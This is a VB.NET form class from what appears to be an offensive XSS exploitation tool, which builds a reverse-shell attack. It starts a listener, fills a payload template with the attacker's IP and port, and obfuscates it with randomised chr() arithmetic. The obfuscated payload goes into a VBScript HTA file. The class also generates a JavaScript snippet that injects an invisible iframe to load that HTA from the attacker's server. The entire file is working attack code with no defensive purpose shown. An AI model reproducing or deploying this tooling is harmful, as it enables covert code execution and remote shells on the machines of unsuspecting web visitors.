Public Class xss_hta_reverseshell

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        On Error Resume Next
        Dim jnk As Integer = Int32.TryParse(TextBox6.Text, jnk)
        If Not Int32.TryParse(TextBox6.Text, jnk) Or TextBox6.Text = "" Or jnk < 1 Or jnk > 65355 Then
            MsgBox("Enter a valid Port Number", vbCritical)
        ElseIf jnk = 3555 Then
            MsgBox("Reserved Port", vbCritical)
        Else
            Dim cmp As String
            cmp = " " & TextBox6.Text
            Process.Start("listener.exe", cmp)
            Button1.Enabled = True
        End If
    End Sub
    Public Function Encoder(ByVal n As Integer) As String

        Dim r, k As Integer
        Dim ret As String = ""
        r = Int(Rnd() * 10000)
        k = Int(Rnd() * 3)
        If (k = 0) Then
            ret = (r + n) & "-" & r
        End If
        If (k = 1) Then
            ret = (n - r) & "+" & r
        End If

        If (k = 2) Then
            ret = (n * r) & "/" & r
        End If
        Return ret

    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        On Error Resume Next

        TextBox6.Enabled = False
        TextBox1.Text = TextBox1.Text.Replace("XSERVERX", xss_server.server_ip).Replace("XIPX", TextBox3.Text).Replace("XPORTX", TextBox6.Text)
        Dim enc As String = ""
        For i = 1 To Len(TextBox1.Text)
            enc = enc & "chr( " & Encoder(Asc(Mid(TextBox1.Text, i, 1))) & " ) & "
        Next
        System.IO.File.WriteAllText(Application.StartupPath & "\window.hta", "<TITLE>IE Window</TITLE><script language='VBScript'> Execute(" & enc & " vbCrLf ) </script>")
        Dim q As String = """"
        Dim streamx As New IO.StreamWriter(Application.StartupPath & "\xss.js")
        streamx.WriteLine("var ifmhta=document.createElement('iframe');")
        streamx.WriteLine("ifmhta.setAttribute('src','http://" & xss_server.server_ip & "/window.hta'); ifmhta.width=0; ifmhta.height=0;")
        streamx.WriteLine("document.body.appendChild(ifmhta);")
        streamx.Close()
        Button1.Enabled = False
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("window.hta")
        Me.Close()
    End Sub

    Private Sub xss_hta_reverseshell_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("window.hta")
        Button1.Enabled = False
        TextBox3.Text = xss_server.ip.Text
    End Sub
End Class